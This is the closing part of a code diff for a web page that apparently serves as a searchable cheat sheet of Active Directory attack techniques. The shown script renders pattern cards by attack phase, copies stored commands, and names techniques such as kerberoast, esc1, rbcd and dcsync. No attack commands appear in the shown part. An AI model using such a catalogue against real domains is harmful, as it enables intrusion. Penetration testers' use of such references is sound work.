+  if (f.length === 0) { resultsEl.innerHTML = `<div class="empty"><div class="empty-icon">⌬</div><div class="empty-title">no patterns match</div><div class="empty-hint">try: 'kerberoast', 'genericall', 'esc1', 'rbcd', 'dcsync'</div></div>`; return; }
+  let html = '';
+  if (activeFilter === 'all' && !query) {
+    phaseOrder.forEach(ph => {
+      const inPh = f.filter(p => p.phase === ph);
+      if (!inPh.length) return;
+      html += `<div style="margin: 18px 0 10px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.2em;">▸ ${phaseLabels[ph]} <span style="opacity:0.5">[${inPh.length}]</span></div>`;
+      html += `<div class="grid">${inPh.map(p => renderCard(p, query)).join('')}</div>`;
+    });
+  } else { html = `<div class="grid">${f.map(p => renderCard(p, query)).join('')}</div>`; }
+  resultsEl.innerHTML = html;
+  resultsEl.querySelectorAll('.cmd-copy').forEach(btn => {
+    btn.addEventListener('click', async (e) => {
+      e.stopPropagation();
+      try { await navigator.clipboard.writeText(decodeURIComponent(btn.dataset.cmd)); btn.textContent = 'COPIED'; btn.classList.add('copied'); setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1500); } catch (err) { btn.textContent = 'ERR'; }
+    });
+  });
+}
+function updateCounts() {
+  $('#totalCount').textContent = patterns.length;
+  $('#count-all').textContent = patterns.length;
+  phaseOrder.forEach(ph => { const c = patterns.filter(p => p.phase === ph).length; const el = document.getElementById(`count-${ph}`); if (el) el.textContent = c; });
+  const uE = document.getElementById('count-state-user'); const aE = document.getElementById('count-state-admin');
+  if (uE) uE.textContent = patterns.filter(p => p.state === 'user' || p.state === 'both').length;
+  if (aE) aE.textContent = patterns.filter(p => p.state === 'admin' || p.state === 'both').length;
+}
+searchEl.addEventListener('input', (e) => { query = e.target.value.trim(); render(); });
+filterBtns.forEach(btn => { btn.addEventListener('click', () => { activeFilter = btn.dataset.filter; filterBtns.forEach(b => b.classList.toggle('active', b === btn)); render(); document.getElementById('cards').scrollIntoView({behavior: 'smooth', block: 'start'}); }); });
+document.addEventListener('keydown', (e) => {
+  if ((e.metaKey || e.ctrlKey) && e.key === 'k') { e.preventDefault(); searchEl.focus(); searchEl.select(); }
+  if (e.key === 'Escape' && document.activeElement === searchEl) { searchEl.value = ''; query = ''; render(); searchEl.blur(); }
+});
+document.querySelectorAll('.diagram svg a').forEach(a => {
+  a.addEventListener('click', (e) => {
+    const href = a.getAttribute('href');
+    if (!href || !href.startsWith('#card-')) return;
+    setTimeout(() => { const t = document.querySelector(href); if (t) { t.classList.remove('flash'); void t.offsetWidth; t.classList.add('flash'); } }, 100);
+  });
+});
+document.querySelectorAll('.checklist li').forEach(li => { li.addEventListener('click', () => li.classList.toggle('done')); });
+updateCounts(); render();
+</script>
+</body>
+</html>
